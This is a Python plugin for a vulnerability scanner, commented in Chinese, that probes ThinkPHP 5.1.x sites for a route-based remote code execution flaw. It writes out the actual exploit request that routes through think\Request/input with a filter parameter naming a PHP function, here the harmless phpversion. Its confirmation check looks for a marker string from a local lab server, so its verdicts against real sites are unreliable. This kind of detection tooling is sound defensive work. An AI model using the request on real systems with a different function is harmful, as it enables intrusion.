# ThinkPHP 5.1.x 路由 think\Request/input 远程代码执行
# 漏洞原因：5.1.x 路由中 think\Request::input 可经 filter 链调用，结合 method 覆盖触发任意函数执行。
# 本插件仅做存在性验证：以 phpversion() 作为探针函数，检测响应特征判定接口是否可达。
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import join_url

# 漏洞命中签名（与 lab/thinkphp_server.py vuln 模式一致；仅用于对拍，非真实利用输出）
RCE_51_MARKER = 'thinkphp-51-request-rce-confirmed'


class Thinkphp51RcePlugin(PluginBase):
    name = 'ThinkPHP 5.1.x 路由远程代码执行'
    cve = 'CNVD-2022-2479'
    severity = 'high'
    category = 'vuln'
    description = '5.1.x 路由 think\\Request/input 经 filter 链调用可执行任意函数（影响 5.1.x 多版本）'
    fix = '升级 ThinkPHP 至官方修复版本；禁用 debug；对路由参数做白名单校验'

    def verify(self, target, session):
        url = join_url(target, '/index.php')
        # 真实利用链参数（探针仅触发 phpversion，不执行破坏性命令）
        params = {
            's': '/index/\\think\\Request/input',
            'filter': 'phpversion',
            'data': '1',
        }
        try:
            resp = session.get(url, params=params)
        except Exception as e:
            print(no('ThinkPHP 5.1.x 路由 RCE（网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))

        text = resp.text or ''
        if RCE_51_MARKER in text:
            print(ok('存在 ThinkPHP 5.1.x 路由远程代码执行漏洞'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence=f'响应含 5.1 路由 RCE 特征：{RCE_51_MARKER}',
                fix=self.fix,
            )
        print(no('不存在 ThinkPHP 5.1.x 路由远程代码执行漏洞'))
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
                          evidence='响应未含 5.1 路由 RCE 特征（可能已修复或接口不可达）')
